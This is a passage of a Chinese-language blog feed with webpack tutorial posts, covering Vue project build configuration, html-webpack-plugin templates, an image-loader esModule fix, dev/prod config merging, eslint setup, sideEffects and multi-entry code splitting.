punctuation">,</span>  module<span class="token punctuation">:</span><span class="token punctuation">{</span>    rules<span class="token punctuation">:</span><span class="token punctuation">[</span>      <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">VueLoaderPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre><blockquote><p>再次运行 npm run server 打包成功，在 dist 目录下生成了 bundle.js</p><p>此时只有一个 js 文件，那么怎么能运行呢，这时就需要 html-webpack-plugin 和 webpack-dev-server 了</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> VueLoaderPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vue-loader/lib/plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">{</span> CleanWebpackPlugin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'clean-webpack-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> CopyWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'copy-webpack-plugin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 入口</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>     filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>     path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span><span class="token punctuation">{</span>    rules<span class="token punctuation">:</span><span class="token punctuation">[</span>      <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">VueLoaderPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 清除 dist</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 生成引入 bundle.js 的 index.html</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">CopyWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 拷贝 public 目录</span>      patterns<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span> <span class="token keyword">from</span><span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          to<span class="token punctuation">:</span> <span class="token string">'public'</span>         <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre><blockquote><p>// 然后修改脚本</p><p>“scripts”: {</p><p>  “serve”: “webpack-dev-server –config webpack.dev.js –open –hot”,</p><p> },</p><p>再次运行 npm run serve，成功打开页面，但是里面什么也没有，按 F12检查发现报错</p><p>Vue warn: Cannot find element: #app</p></blockquote><p>发现在生成的 index.html 文件中没有 div id=”app” 的元素，原来是在使用 html-webpack-plugin 的时候没有使用template，检查目录发现在public目录下有写好的 index.html</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>IE<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width,initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> BASE_URL %<span class="token punctuation">></span>favicon.ico<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>&lt;%= htmlWebpackPlugin.options.title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>We're sorry but &lt;%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- built files will be auto injected --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>其中 BASE_URL 需要使用 DefinePlugin 注入全局成员，title 就在 htmlWebpackPlugin 配置</p><pre class=" language-js"><code class="language-js">  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">VueLoaderPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      title<span class="token punctuation">:</span> <span class="token string">'this is a title'</span><span class="token punctuation">,</span>      template <span class="token punctuation">:</span> <span class="token string">'./public/index.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      BASE_URL<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'./public/'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span></code></pre><blockquote><p>然后页面就正常打开了，但是有一张图片没有显示，显示：</p><p>img src=”[object Module]”</p><p>原因是在url-loader内部封装了file-loader 而file-loader在<strong>新版本</strong>中<strong>esModule</strong>属性默认为<code>true</code> 即<strong>默认使用ES模块语法</strong>，导致了造成了引用图片文件的方式和以前的版本不一样 引入路径改变了 自然找不到图片</p></blockquote><pre class=" language-js"><code class="language-js">    <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.png$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">{</span>          loader<span class="token punctuation">:</span> <span class="token string">'url-loader'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 大于10KB的还会使用file-loader</span>          options<span class="token punctuation">:</span> <span class="token punctuation">{</span>            limit<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 10 KB</span>            esModule<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token comment" spellcheck="true">// 取消使用 esModules</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span></code></pre><p>再次运行页面就能正常打开了，并且试了热更新功能没问题，但是在开发环境下没必要拷贝 public 目录，设置一下 contentBase 即可</p><pre class=" language-js"><code class="language-js">devServer<span class="token punctuation">:</span> <span class="token punctuation">{</span>    contentBase<span class="token punctuation">:</span> <span class="token string">'./public'</span><span class="token punctuation">,</span>    hot<span class="token punctuation">:</span> <span class="token boolean">true</span>  <span class="token comment" spellcheck="true">// 热更新也可以在这配置</span><span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><h2 id="配置-webpack-prod-js-和-webpack-common-js"><a href="#配置-webpack-prod-js-和-webpack-common-js" class="headerlink" title="配置 webpack.prod.js 和 webpack.common.js"></a>配置 webpack.prod.js 和 webpack.common.js</h2><p>在生产环境下，就需要拷贝 public 目录了，并且设置 <code>mode: &#39;production&#39;</code>，通过 webpack-merge 合并</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.dev.js</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> common <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./webpack.common.js'</span><span class="token punctuation">)</span><span class="token keyword">const</span> webpackMerge <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> webpackMerge<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>common<span class="token punctuation">,</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  devServer<span class="token punctuation">:</span> <span class="token punctuation">{</span>    contentBase<span class="token punctuation">:</span> <span class="token string">'./public'</span><span class="token punctuation">,</span>    hot<span class="token punctuation">:</span> <span class="token boolean">true</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// webpack.prod.js</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> common <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./webpack.common.js'</span><span class="token punctuation">)</span><span class="token keyword">const</span> webpackMerge <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span><span class="token keyword">const</span> CopyWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'copy-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> webpackMerge<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>common<span class="token punctuation">,</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'production'</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">CopyWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      patterns<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>           <span class="token keyword">from</span><span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          to<span class="token punctuation">:</span> <span class="token string">'public'</span>         <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.common.js</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> VueLoaderPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vue-loader/lib/plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">{</span> CleanWebpackPlugin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'clean-webpack-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 入口</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>     filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>     path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span><span class="token punctuation">{</span>    rules<span class="token punctuation">:</span><span class="token punctuation">[</span>      <span class="token punctuation">{</span>         test<span class="token punctuation">:</span> <span class="token regex">/\.vue$/</span><span class="token punctuation">,</span>         use<span class="token punctuation">:</span> <span class="token string">'vue-loader'</span>       <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.css$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.less$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span><span class="token punctuation">,</span>          <span class="token string">'less-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.png$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">{</span>          loader<span class="token punctuation">:</span> <span class="token string">'url-loader'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 大于10KB的还会使用file-loader</span>          options<span class="token punctuation">:</span> <span class="token punctuation">{</span>            limit<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 10 KB</span>            esModule<span class="token punctuation">:</span> <span class="token boolean">false</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">VueLoaderPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      title<span class="token punctuation">:</span> <span class="token string">'this is a title'</span><span class="token punctuation">,</span>      template <span class="token punctuation">:</span> <span class="token string">'./public/index.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      BASE_URL<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'./public/'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h2 id="配置eslint"><a href="#配置eslint" class="headerlink" title="配置eslint"></a>配置eslint</h2><p><code>eslint --init</code>时模块下载失败，这里我就手动安装一下：</p><pre class=" language-js"><code class="language-js">cnpm i <span class="token operator">-</span>D eslint<span class="token operator">-</span>plugin<span class="token operator">-</span>vue eslint<span class="token operator">-</span>config<span class="token operator">-</span>standard eslint eslint<span class="token operator">-</span>plugin<span class="token operator">-</span><span class="token keyword">import</span> eslint<span class="token operator">-</span>plugin<span class="token operator">-</span>node eslint<span class="token operator">-</span>plugin<span class="token operator">-</span>promise eslint<span class="token operator">-</span>plugin<span class="token operator">-</span>standard</code></pre><p>然后在<code>webpack.common.js</code>中配置一下就可以</p><pre class=" language-js"><code class="language-js">      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.vue$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'vue-loader'</span><span class="token punctuation">,</span>          <span class="token string">'eslint-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><p>然后再<code>package.json</code>中再配置一下</p><pre class=" language-js"><code class="language-js"><span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"lint"</span><span class="token punctuation">:</span> <span class="token string">"eslint src/**/*.vue"</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（四）</title>
      <link href="2020/09/08/webpack-webpack%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>2020/09/08/webpack-webpack%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>Webpack sideEffects</li><li>Code Splitting</li><li>mini-css-extract-plugin</li><li>文件名 Hash</li></ul><h2 id="Webpack-sideEffects"><a href="#Webpack-sideEffects" class="headerlink" title="Webpack sideEffects"></a>Webpack sideEffects</h2><blockquote><p>副作用：模块执行时除了导出成员之外所做的事情</p><p>比如一个 css 文件没有导出，可认为有副作用</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token operator">|</span><span class="token operator">--</span>components        <span class="token operator">--</span>button<span class="token punctuation">.</span>js        <span class="token operator">--</span>heading<span class="token punctuation">.</span>js        <span class="token operator">--</span>link<span class="token punctuation">.</span>js        <span class="token operator">--</span>index<span class="token punctuation">.</span>js<span class="token operator">|</span><span class="token operator">--</span>index<span class="token punctuation">.</span>js</code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// components/index.js</span><span class="token keyword">export</span> <span class="token punctuation">{</span> <span class="token keyword">default</span> <span class="token keyword">as</span> Button <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./button'</span><span class="token keyword">export</span> <span class="token punctuation">{</span> <span class="token keyword">default</span> <span class="token keyword">as</span> Link <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./link'</span><span class="token keyword">export</span> <span class="token punctuation">{</span> <span class="token keyword">default</span> <span class="token keyword">as</span> Heading <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./heading'</span><span class="token comment" spellcheck="true">// 入口文件 index.js</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Button <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./components'</span><span class="token comment" spellcheck="true">// 只想载入 Button 却载入了所有模块</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.config.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/index.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.css$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>    sideEffects<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 标识为true就会去package.json中去检查有无副作用</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// package.json</span><span class="token punctuation">{</span>  <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"31-side-effects"</span><span class="token punctuation">,</span>  <span class="token string">"version"</span><span class="token punctuation">:</span> <span class="token string">"0.1.0"</span><span class="token punctuation">,</span>  <span class="token string">"main"</span><span class="token punctuation">:</span> <span class="token string">"index.js"</span><span class="token punctuation">,</span>  <span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token string">"zce &lt;w@zce.me> (https://zce.me)"</span><span class="token punctuation">,</span>  <span class="token string">"license"</span><span class="token punctuation">:</span> <span class="token string">"MIT"</span><span class="token punctuation">,</span>  <span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"build"</span><span class="token punctuation">:</span> <span class="token string">"webpack"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token string">"devDependencies"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"css-loader"</span><span class="token punctuation">:</span> <span class="token string">"^3.2.0"</span><span class="token punctuation">,</span>    <span class="token string">"style-loader"</span><span class="token punctuation">:</span> <span class="token string">"^1.0.0"</span><span class="token punctuation">,</span>    <span class="token string">"webpack"</span><span class="token punctuation">:</span> <span class="token string">"^4.41.2"</span><span class="token punctuation">,</span>    <span class="token string">"webpack-cli"</span><span class="token punctuation">:</span> <span class="token string">"^3.3.9"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// "sideEffects": false  //设置为false说明没有副作用，则多余的模块不会被打包</span>  <span class="token string">"sideEffects"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"./src/extend.js"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 标识一下有副作用而不想被删除的模块，防止不会被打包</span>    <span class="token string">"*.css"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h2 id="代码分割"><a href="#代码分割" class="headerlink" title="代码分割"></a>代码分割</h2><blockquote><p>所有模块都打包到一起，但是并不是每个模块在启动时都是必要的</p><p>分包，按需加载</p></blockquote><ul><li>多入口打包：一个页面一个入口，公共部分提取</li><li>动态导入</li></ul><h3 id="多入口打包配置"><a href="#多入口打包配置" class="headerlink" title="多入口打包配置"></a>多入口打包配置</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> CleanWebpackPlugin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'clean-webpack-plugin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token punctuation">{</span>    index<span class="token punctuation">:</span> <span class="token string">'./src/index.js'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 多入口</span>    album<span class="token punctuation">:</span> <span class="token string">'./src/album.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'[name].bundle.js'</span> <span class="token comment" spellcheck="true">// 生成对应的文件名</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>    splitChunks<span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 自动提取所有公共模块到单独 bundle 一个文件</span>      chunks<span class="token punctuation">:</span> <span class="token string">'all'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.css$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      title<span class="token punctuation">:</span> <span class="token string">'Multi Entry'</span><span class="token punctuation">,</span>      template<span class="token punctuation">:</span> <span class="token string">'./src/index.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span><span class="token punctuation">,</span>      chunks<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">// index.html 只会引入打包后的 index.js</span>    <span class="token punctuation">}</span><span class="token 